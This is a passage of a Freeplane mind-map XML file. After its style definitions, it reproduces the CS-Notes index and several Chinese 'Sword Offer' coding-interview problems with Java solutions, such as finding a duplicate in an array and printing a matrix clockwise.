<stylenode TEXT="process" ID="ID_858991101" MAX_WIDTH="1200 px">
<arrowlink DESTINATION="ID_858991101"/>
<edge WIDTH="1"/>
</stylenode>
<stylenode TEXT="note" ICON_SIZE="12 pt" FORMAT_AS_HYPERLINK="false" COLOR="#333333" BACKGROUND_COLOR="#ffffcc" STYLE="rectangle" SHAPE_HORIZONTAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" TEXT_ALIGN="DEFAULT" TEXT_WRITING_DIRECTION="LEFT_TO_RIGHT" MAX_WIDTH="600 px" MIN_WIDTH="50 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_COLOR="#ffffcc" BORDER_DASH_LIKE_EDGE="false" BORDER_DASH="SOLID" VGAP_QUANTITY="2 pt" COMMON_HGAP_QUANTITY="14 pt" CHILD_NODES_LAYOUT="AUTO_CENTERED">
<font NAME="Microsoft YaHei" SIZE="8" BOLD="false" STRIKETHROUGH="false" ITALIC="false"/>
<richcontent TYPE="DETAILS" CONTENT-TYPE="plain/html"/>
<edge STYLE="hide_edge" COLOR="#cccccc" WIDTH="1" DASH="SOLID"/>
<richcontent TYPE="NOTE" CONTENT-TYPE="plain/html"/>
</stylenode>
<stylenode TEXT="pin" ICON_SIZE="8 pt" FORMAT_AS_HYPERLINK="false" BACKGROUND_COLOR="#ffffcc" STYLE="rectangle" SHAPE_HORIZONTAL_MARGIN="0 pt" SHAPE_VERTICAL_MARGIN="0 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" TEXT_ALIGN="LEFT" TEXT_WRITING_DIRECTION="LEFT_TO_RIGHT" MAX_WIDTH="800 px" MIN_WIDTH="10 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR="#ffffcc" BORDER_DASH_LIKE_EDGE="false" BORDER_DASH="SOLID" VGAP_QUANTITY="2 pt" COMMON_HGAP_QUANTITY="5 pt" CHILD_NODES_LAYOUT="AUTO_CENTERED">
<icon BUILTIN="emoji-1F4CD"/>
<font SIZE="5" BOLD="false" STRIKETHROUGH="false" ITALIC="false"/>
<richcontent TYPE="DETAILS" CONTENT-TYPE="plain/html"/>
<edge STYLE="hide_edge" WIDTH="1"/>
<richcontent TYPE="NOTE" CONTENT-TYPE="plain/html"/>
</stylenode>
<stylenode TEXT="nested" ICON_SIZE="15 pt" FORMAT_AS_HYPERLINK="false" COLOR="#333333" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" TEXT_ALIGN="DEFAULT" TEXT_WRITING_DIRECTION="LEFT_TO_RIGHT" MAX_WIDTH="800 px" MIN_WIDTH="50 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_COLOR="#cccccc" BORDER_COLOR_ALPHA="0" BORDER_DASH_LIKE_EDGE="false" BORDER_DASH="SOLID" VGAP_QUANTITY="2 pt" COMMON_HGAP_QUANTITY="14 pt" CHILD_NODES_LAYOUT="TOPTOBOTTOM_RIGHT_BOTTOM">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false" STRIKETHROUGH="false" ITALIC="false"/>
<richcontent TYPE="DETAILS" CONTENT-TYPE="plain/html"/>
<hook NAME="NodeCss">
h1 {
  color:#B5A0C9; /*#B5A0C9;*/
  font-size: 14pt;
}
h2 {
  color:#400080; /*#400080,#B5A0C9;*/
  font-size: 13pt;
  border-bottom: 2px solid #E1EBF5;
}
h3 {
  color:#5D17A3; /*#5D17A3,#B5A0C9;*/
  font-size: 12pt;
  padding-left: 5px;
}

h4 {
  color:#8148BA; /*#8148BA,#877EB8;*/
  font-size: 10pt;
  padding-left: 5px;
}

h5 {
  color: #B591D9; /*#B591D9,#8160A1;*/
  font-size: 9pt;
  padding-left: 5px;
}
h6 {
  color: #D5C5E6; /*#D5C5E6,#FFFFFF;*/
  font-size: 8pt;
  padding-left: 5px;
}
.title5 {
  color: #8698F2;
  background-color:#DBE4EB;
  text-decoration: overline;
  font-weight: normal;
}

.title6 {
  color: black,#D5C5E6;
  background-color:#DBE4EB;
  font-weight: normal;
  text-decoration: overline;
}

pre {
  /* font-size: 10pt; */
  margin-left: 10px;
  margin-right: 10px;
  padding: 3px;
  /* background-color:#DBE4EB;  */
  background-color:#DBE4EB; 
  font-family: consolas, Microsoft YaHei, serif;

}
pre.input {
  border-left-color: #89A8D6; 
  /* border-left: 2px solid #89A8D6; */
}
pre.output {
  color: #787AB2;
  border-left: 2px solid #787AB2;
}
/* code.details {
  font-size: 10pt;
} */
code, kbd {
  /* font-size: 10pt; */
  color: #596287;
  /* background-color:#DBE4EB; */
  font-family: consolas, serif;
}

blockquote {
  margin-top: 1px;
  margin-bottom: 1px;
  margin-left: 10px;
  margin-right: 10px;
  color: #769496;
  padding: 5px;
  border-top: 0px solid #769496;
  border-bottom: 0px solid #769496;
  border-left: 1px solid #769496;
  border-right: 0px solid #769496;
}

table {
  width: 100%;
  margin: 1px;
}

th {
  background-color:#DBE4EB;
}
/* th, td {
  border: 1px solid #E8E8E8;
} */
th, td {
  text-align: left; 
  border-top: 0px solid white;
  border-bottom: 1px solid #CCCCCC;
  border-left: 0px solid white;
  border-right: 0px solid white;
}
tr {
  text-align: left; 
}


ol, ul, dl {
  margin-left: 20px;
}

ul.outline {
  list-style-type: none; /* 移除列表项目符号 */
  margin-left: 10px; /* 列表的整体左边距 */
  padding-left: 0; /* 移除列表的内边距 */
}

ul.outline li {
  border-left: 1px solid gray; /* 左侧显示竖线 */
  padding-left: 5px; /* 列表项内容与竖线之间的空间 */
}

a {
  color: #829CF8;
}

abbr {
  color: gray;
  text-decoration: dotted;
}

img {
  width: 100%;
}

details {
  border: 1px solid #24272E;
}

/* p {
  padding-top: 3pt;
  padding-bottom: 3pt;
} */

.toc {
   border-top: 2px solid #DBE4EB;
}

.info, .info-details {
  background-color:#DBE4EB;
  border-top: 1px solid #C9C9E0;
  border-bottom: 1px solid #C9C9E0;
  border-left: 0px solid #C9C9E0;
  border-right: 0px solid #C9C9E0;
}
.warn, .warn-details {
  background-color:#DBE4EB;
  color: #F54D4D;
  border-top: 1px solid #F54D4D;
  border-bottom: 1px solid #F54D4D;
  border-left: 0px solid #F54D4D;
  border-right: 0px solid #F54D4D;
}
.check, .check-details {
  background-color:#DBE4EB;
  color: green;
  border-top: 1px solid green;
  border-bottom: 1px solid green;
  border-left: 0px solid green;
  border-right: 0px solid green;
}
.refer, .refer-details {
  /* font-family: 迷你简启体; */
  /* font-size: 11pt; */
  font-style: italic;
  background-color:#DBE4EB;
  border-top: 1px solid #C9C9E0;
  border-bottom: 1px solid #C9C9E0;
  border-left: 0px solid #C9C9E0;
  border-right: 0px solid #C9C9E0;
}
.details {
  background-color:#E9E5ED;
  /* border: 1px dashed #666666; */
}
.default-details, .info-details, .warn-details, .check-details, .refer-details {
  text-decoration: none;
  border-style: dashed;
}

.code-public {
  color: #0D9A37;
}
/* .code-public {
  color: #F4EA2A;
} */
.code-private {
  color: red;
}
.code-static {
  font-style: italic;
  text-decoration: underline;
  /* background-color: gray; */
}
.code-method {
  color: #72A9FF;
  font-weight: bold;
}
.code-field {
  color: #E66D64;
  font-weight: bold;
}
.code-class {
  color: #A2BA1B;
  font-weight: bold;
}
.code-enum {
  color: #3DCC7D;
  font-weight: bold;
}
.code-constructor {
  color: #4C6CF5;
  font-weight: bold;
}
.code-interface {
  color: #AB4986;
}
.code-annotation {
  color: #AB4986;
  font-weight: bold;
}
.code-exception {
  color: #CC3142;
}
.code-param {
  font-weight: normal;
}
.code-string {
  color: #965D23;
}
.code-comment {
  color: gray;
}


.color-blue {
  color: #72A9FF;
}
.color-orange {
  color: #FFA952;
}
.color-yellow {
  color: #A2BA1B,yellow;
}
.color-green {
  color: #3DCC7D;
}
.color-purple {
  color: #4C6CF5;
}
.color-gray {
  color:#a79c9c;
  font-weight: normal;
}
.color-red {
  color: #CC3142;
  font-weight: normal;
}

.point-red, .background-color-red {
  color: black,white;
  background-color: #CC3142;
}
.point-blue, .background-color-blue {
  color: black;
  background-color: #C9D5FF;
}
.point-orange, .background-color-orange {
  color: black;
  background-color: #FFA952;
  
}
.point-yellow, .background-color-yellow, .highlight {
  color: black;
  background-color: yellow;
}
.point-green, .background-color-green {
  color: black;
  color: #3DCC7D;
}
.point-gray, .background-color-gray {
  color: black,white;
  background-color:#CCCCCC;
  font-weight: normal;
  
}

.ai-explaination {
  border-left: dotted; 
  color: gray; 
  padding-left: 10px;
}
.translation {
  /* font-size: 8pt; */
  padding: 2px;
  margin-left: 5px;
  margin-right: 5px;
  color: gray;
  border: 1px dotted;
}

small, .inlinecomment {
  color: #ADADAD, gray;
  font-size: 9pt;
}


div.ai-chatgpt {
  border: 1px dotted;
  border-color: orange;
  margin: 2pt;
  padding: 2pt;
}

a.quicker-nav {
  color: gray;
}

.reference {
  font-style: italic;
}

div.tag, div.details, div.note {
  border-top: 1px solid gray; 
  margin: 0px 0;
}
</hook>
<edge STYLE="hide_edge" COLOR="#cccccc" WIDTH="1" DASH="SOLID"/>
<richcontent TYPE="NOTE" CONTENT-TYPE="plain/html"/>
<cloud COLOR="#ffffff" SHAPE="RECT"/>
</stylenode>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.AutomaticLayout" POSITION="bottom_or_right" STYLE="bubble" FORMAT="STANDARD_FORMAT" BORDER_WIDTH="1 px">
<edge STYLE="horizontal" COLOR="#cccccc" WIDTH="2"/>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level.root" ICON_SIZE="15 pt" COLOR="#333333" BACKGROUND_COLOR="#cccccc" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="20 pt" SHAPE_VERTICAL_MARGIN="10 pt" FORMAT="STANDARD_FORMAT" MAX_WIDTH="15 cm" BORDER_WIDTH="1.5 px" BORDER_COLOR="#fdfdfc" CHILD_NODES_LAYOUT="TOPTOBOTTOM_RIGHT_AUTO" VGAP_QUANTITY="5 pt" COMMON_HGAP_QUANTITY="25 pt">
<font NAME="Microsoft YaHei" SIZE="16" BOLD="false" STRIKETHROUGH="false"/>
<edge STYLE="horizontal" WIDTH="2" DASH="SOLID"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,1" ICON_SIZE="15 pt" COLOR="#333333" BACKGROUND_COLOR="#f5f5f5" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="10 pt" SHAPE_VERTICAL_MARGIN="5 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="15 cm" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_COLOR="#dbdbdb" VGAP_QUANTITY="3 pt" COMMON_HGAP_QUANTITY="25 pt">
<font NAME="Microsoft YaHei" SIZE="14" BOLD="false"/>
<edge STYLE="horizontal" WIDTH="2" DASH="SOLID"/>
</stylenode>
</stylenode>
</stylenode>
</map_styles>
</hook>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <a href="https://www.cyc2018.xyz/"><img src="https://camo.githubusercontent.com/5893ddfb3e58e43ef54f9def830600414d6259ea871df6d0b9c7957f08ecd65b/68747470733a2f2f62616467656e2e6e65742f62616467652f4379432f2545352539432541382545372542412542462545392539382538352545382541462542423f69636f6e3d736f75726365677261706826636f6c6f723d346162386131" width="99" height="20" style="width: 99px; height: 20px;"/>
      </a>&#xa0;<a href="https://gitstar-ranking.com/repositories"><img src="https://camo.githubusercontent.com/9d9388d99aba0167d7e03e2d3b41a90898abfa80e4fbe18a79d1dcadd5ed39e9/68747470733a2f2f62616467656e2e6e65742f62616467652f52616e6b2f31333f69636f6e3d67697468756226636f6c6f723d346162386131" width="75" height="20" style="width: 75px; height: 20px;"/></a>&#xa0;<a href="https://github.com/CyC2018/CS-Notes"><img src="https://camo.githubusercontent.com/d5ba627503d83fae8737159af3403998e8b77db833b0a3a3070741dd48435203/68747470733a2f2f62616467656e2e6e65742f6769746875622f73746172732f437943323031382f43532d4e6f7465733f69636f6e3d67697468756226636f6c6f723d346162386131" width="100" height="20" style="width: 100px; height: 20px;"/></a>&#xa0;<a href="https://github.com/CyC2018/CS-Notes"><img src="https://camo.githubusercontent.com/a64cbd49ca2430ff76ee6ab6d266ae9005ab6b16731b71adbbc4322872f6cd95/68747470733a2f2f62616467656e2e6e65742f6769746875622f666f726b732f437943323031382f43532d4e6f7465733f69636f6e3d67697468756226636f6c6f723d346162386131" width="93" height="20" style="width: 93px; height: 20px;"/></a>
    </p>
    <div class="tableWrapper">
      <table>
        <colgroup>
        <col/>
        <col/>
        <col/>
        <col/>
        <col/>
        <col/>
        <col/>
        <col/>
        <col/>
        <col/>
        </colgroup>
        

        <tr>
          <th colspan="1" rowspan="1">
            <p>
              <strong>算法&#xa0;</strong>
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              <strong>操作系统</strong>
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              <strong>网络&#xa0;</strong>
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              <strong>面向对象</strong>
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              <strong>&#xa0;数据库&#xa0;&#xa0;</strong>
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              <strong>&#xa0;Java&#xa0;&#xa0;</strong>
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              <strong>系统设计</strong>
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              <strong>&#xa0;&#xa0;工具&#xa0;&#xa0;</strong>
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              <strong>编码实践</strong>
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              <strong>&#xa0;&#xa0;后记&#xa0;&#xa0;</strong>
            </p>
          </th>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              ✏
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              💻
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              ☁
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              🎨
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              💾
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              ☕
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              💡
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              🔧
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              🍉
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              📝
            </p>
          </td>
        </tr>
      </table>
    </div>
    <p>
      <img src="https://camo.githubusercontent.com/79863889da503cc774e1672d05423e4dbcd6b91fc7d3efed9dac3bf34a70d08b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f676974687562696f2f4c6f676f4d616b725f307a70457a4e2e706e67" width="150" height="160" style="width: 150px; height: 160px;"/>
    </p>
  </body>
</html></richcontent>
<richcontent TYPE="DETAILS">
<html>
  <head>
    
  </head>
  <body>
    <p>
      作者：CyC2018
    </p>
  </body>
</html></richcontent>
<node FOLDED="true" POSITION="bottom_or_right" ID="ID_537721187" CREATED="1754749744623" MODIFIED="1754749800778" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>算法</strong>
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_590617443" CREATED="1754749800761" MODIFIED="1754750400523" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%89%91%E6%8C%87%20Offer%20%E9%A2%98%E8%A7%A3%20-%20%E7%9B%AE%E5%BD%95.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      剑指 Offer 题解
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1404592410" CREATED="1754750400525" MODIFIED="1754750407689" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      前言
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 前言" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%89%91%E6%8C%87%20Offer%20%E9%A2%98%E8%A7%A3%20-%20%E7%9B%AE%E5%BD%95.md#前言">
</a>
    <p dir="auto">
      题目来自《何海涛. 剑指 Offer[M]. 电子工业出版社, 2012.》，刷题网站推荐：
    </p>
  </body>
</html></richcontent>
<node ID="ID_567726587" CREATED="1754750407678" MODIFIED="1754750407682" LINK="https://www.nowcoder.com/ta/coding-interviews?from=cyc_github"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <span rel="nofollow">牛客网</span>
  </body>
</html>
</richcontent>
</node>
<node ID="ID_1900318552" CREATED="1754750407683" MODIFIED="1754750407686" LINK="https://leetcode-cn.com/problemset/lcof/"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <span rel="nofollow">Leetcode</span>
  </body>
</html>
</richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_423646687" CREATED="1754750400529" MODIFIED="1754750410984" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数组与矩阵
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1804068492" CREATED="1754750410963" MODIFIED="1754751102055" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/3.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    3. 数组中重复的数字
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/6fe361ede7e54db1b84adc81d09d8524?tpId=13&amp;tqId=11203&amp;tab=answerKey&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        在一个长度为 n 的数组里的所有数字都在 0 到 n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字是重复的，也不知道每个数字重复几次。请找出数组中任意一个重复的数字。
      </p>
      <pre>Input:
{2, 3, 1, 0, 2, 5}
Output:
2</pre>
      <h2>
        解题思路
      </h2>
      <p>
        要求时间复杂度 O(N)，空间复杂度 O(1)。因此不能使用排序的方法，也不能使用额外的标记数组。
      </p>
      <p>
        对于这种数组元素在 [0, n-1] 范围内的问题，可以将值为 i 的元素调整到第 i 个位置上进行求解。在调整过程中，如果第 i 位置上已经有一个值为 i 的元素，就可以知道 i 值重复。
      </p>
      <p>
        以 (2, 3, 1, 0, 2, 5) 为例，遍历到位置 4 时，该位置上的数为 2，但是第 2 个位置上已经有一个 2 的值了，因此可以知道 2 重复：
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/643b6f18-f933-4ac5-aa7a-e304dbd7fe49.gif" width="350px"/>
        
      </div>
      <br/>
      

      <pre>public int duplicate(int[] nums) {
    for (int i = 0; i &lt; nums.length; i++) {
        while (nums[i] != i) {
            if (nums[i] == nums[nums[i]]) {
                return  nums[i];
            }
            swap(nums, i, nums[i]);
        }
        swap(nums, i, nums[i]);
    }
    return -1;
}
private void swap(int[] nums, int i, int j) {
    int t = nums[i];
    nums[i] = nums[j];
    nums[j] = t;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_402159756" CREATED="1754750410968" MODIFIED="1754751112540" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/4.%20%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    4. 二维数组中的查找
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/abc3fe2ce8e146608e868a70efebf62e?tpId=13&amp;tqId=11154&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        给定一个二维数组，其每一行从左到右递增排序，从上到下也是递增排序。给定一个数，判断这个数是否在该二维数组中。
      </p>
      <pre>Consider the following matrix:
[
  [1,   4,  7, 11, 15],
  [2,   5,  8, 12, 19],
  [3,   6,  9, 16, 22],
  [10, 13, 14, 17, 24],
  [18, 21, 23, 26, 30]
]
Given target = 5, return true.
Given target = 20, return false.</pre>
      <h2>
        解题思路
      </h2>
      <p>
        要求时间复杂度 O(M + N)，空间复杂度 O(1)。其中 M 为行数，N 为 列数。
      </p>
      <p>
        该二维数组中的一个数，小于它的数一定在其左边，大于它的数一定在其下边。因此，从右上角开始查找，就可以根据 target 和当前元素的大小关系来快速地缩小查找区间，每次减少一行或者一列的元素。当前元素的查找区间为左下角的所有元素。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/35a8c711-0dc0-4613-95f3-be96c6c6e104.gif" width="400px"/>
        
      </div>
      <br/>
      

      <pre>public boolean Find(int target, int[][] matrix) {
    if (matrix == null || matrix.length == 0 || matrix[0].length == 0)
        return false;
    int rows = matrix.length, cols = matrix[0].length;
    int r = 0, c = cols - 1; // 从右上角开始
    while (r &lt;= rows - 1 &amp;&amp; c &gt;= 0) {
        if (target == matrix[r][c])
            return true;
        else if (target &gt; matrix[r][c])
            r++;
        else
            c--;
    }
    return false;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_677246147" CREATED="1754750410972" MODIFIED="1754751113043" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/5.%20%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    5. 替换空格
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/0e26e5551f2b489b9f58bc83aa4b6c68?tpId=13&amp;tqId=11155&amp;tab=answerKey&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        将一个字符串中的空格替换成 &quot;%20&quot;。
      </p>
      <pre>Input:
&quot;A B&quot;
Output:
&quot;A%20B&quot;</pre>
      <h2>
        解题思路
      </h2>
      <p>
        ① 在字符串尾部填充任意字符，使得字符串的长度等于替换之后的长度。因为一个空格要替换成三个字符（%20），所以当遍历到一个空格时，需要在尾部填充两个任意字符。
      </p>
      <p>
        ② 令 P1 指向字符串原来的末尾位置，P2 指向字符串现在的末尾位置。P1 和 P2 从后向前遍历，当 P1 遍历到一个空格时，就需要令 P2 指向的位置依次填充 02%（注意是逆序的），否则就填充上 P1 指向字符的值。从后向前遍是为了在改变 P2 所指向的内容时，不会影响到 P1 遍历原来字符串的内容。
      </p>
      <p>
        ③ 当 P2 遇到 P1 时（P2 \&lt;= P1），或者遍历结束（P1 \&lt; 0），退出。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f7c1fea2-c1e7-4d31-94b5-0d9df85e093c.gif" width="350px"/>
        
      </div>
      <br/>
      

      <pre>public String replaceSpace(StringBuffer str) {
    int P1 = str.length() - 1;
    for (int i = 0; i &lt;= P1; i++)
        if (str.charAt(i) == ' ')
            str.append(&quot;  &quot;);
    int P2 = str.length() - 1;
    while (P1 &gt;= 0 &amp;&amp; P2 &gt; P1) {
        char c = str.charAt(P1--);
        if (c == ' ') {
            str.setCharAt(P2--, '0');
            str.setCharAt(P2--, '2');
            str.setCharAt(P2--, '%');
        } else {
            str.setCharAt(P2--, c);
        }
    }
    return str.toString();
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1535354649" CREATED="1754750410976" MODIFIED="1754751113483" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/29.%20%E9%A1%BA%E6%97%B6%E9%92%88%E6%89%93%E5%8D%B0%E7%9F%A9%E9%98%B5.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    29. 顺时针打印矩阵
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/9b4c81a02cd34f76be2659fa0d54342a?tpId=13&amp;tqId=11172&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        按顺时针的方向，从外到里打印矩阵的值。下图的矩阵打印结果为：1, 2, 3, 4, 8, 12, 16, 15, 14, 13, 9, 5, 6, 7, 11, 10
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201104010349296.png" width="300px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <p>
        一层一层从外到里打印，观察可知每一层打印都有相同的处理步骤，唯一不同的是上下左右的边界不同了。因此使用四个变量 r1, r2, c1, c2 分别存储上下左右边界值，从而定义当前最外层。打印当前最外层的顺序：从左到右打印最上一行-&gt;从上到下打印最右一行-&gt;从右到左打印最下一行-&gt;从下到上打印最左一行。应当注意只有在 r1 != r2 时才打印最下一行，也就是在当前最外层的行数大于 1 时才打印最下一行，这是因为当前最外层只有一行时，继续打印最下一行，会导致重复打印。打印最左一行也要做同样处理。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201104010609223.png" width="500px"/>
        
      </div>
      <br/>
      

      <pre>public ArrayList&lt;Integer&gt; printMatrix(int[][] matrix) {
    ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;();
    int r1 = 0, r2 = matrix.length - 1, c1 = 0, c2 = matrix[0].length - 1;
    while (r1 &lt;= r2 &amp;&amp; c1 &lt;= c2) {
        // 上
        for (int i = c1; i &lt;= c2; i++)
            ret.add(matrix[r1][i]);
        // 右
        for (int i = r1 + 1; i &lt;= r2; i++)
            ret.add(matrix[i][c2]);
        if (r1 != r2)
            // 下
            for (int i = c2 - 1; i &gt;= c1; i--)
                ret.add(matrix[r2][i]);
        if (c1 != c2)
            // 左
            for (int i = r2 - 1; i &gt; r1; i--)
                ret.add(matrix[i][c1]);
        r1++; r2--; c1++; c2--;
    }
    return ret;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1959525595" CREATED="1754750410979" MODIFIED="1754751113485" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/50.%20%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E5%AD%97%E7%AC%A6%E4%BD%8D%E7%BD%AE.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    50. 第一个只出现一次的字符位置
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/1c82e8cf713b4bbeb2a5b31cf5b0417c?tpId=13&amp;tqId=11187&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        在一个字符串中找到第一个只出现一次的字符，并返回它的位置。字符串只包含 ASCII 码字符。
      </p>
      <pre>Input: abacc
Output: b</pre>
      <h2>
        解题思路
      </h2>
      <p>
        最直观的解法是使用 HashMap 对出现次数进行统计：字符做为 key，出现次数作为 value，遍历字符串每次都将 key 对应的 value 加 1。最后再遍历这个 HashMap 就可以找出出现次数为 1 的字符。
      </p>
      <p>
        考虑到要统计的字符范围有限，也可以使用整型数组代替 HashMap。ASCII 码只有 128 个字符，因此可以使用长度为 128 的整型数组来存储每个字符出现的次数。
      </p>
      <pre>public int FirstNotRepeatingChar(String str) {
    int[] cnts = new int[128];
    for (int i = 0; i &lt; str.length(); i++)
        cnts[str.charAt(i)]++;
    for (int i = 0; i &lt; str.length(); i++)
        if (cnts[str.charAt(i)] == 1)
            return i;
    return -1;
}</pre>
      <p>
        以上实现的空间复杂度还不是最优的。考虑到只需要找到只出现一次的字符，那么需要统计的次数信息只有 0,1,更大，使用两个比特位就能存储这些信息。
      </p>
      <pre>public int FirstNotRepeatingChar2(String str) {
    BitSet bs1 = new BitSet(128);
    BitSet bs2 = new BitSet(128);
    for (char c : str.toCharArray()) {
        if (!bs1.get(c) &amp;&amp; !bs2.get(c))
            bs1.set(c);     // 0 0 -&gt; 0 1
        else if (bs1.get(c) &amp;&amp; !bs2.get(c))
            bs2.set(c);     // 0 1 -&gt; 1 1
    }
    for (int i = 0; i &lt; str.length(); i++) {
        char c = str.charAt(i);
        if (bs1.get(c) &amp;&amp; !bs2.get(c))  // 0 1
            return i;
    }
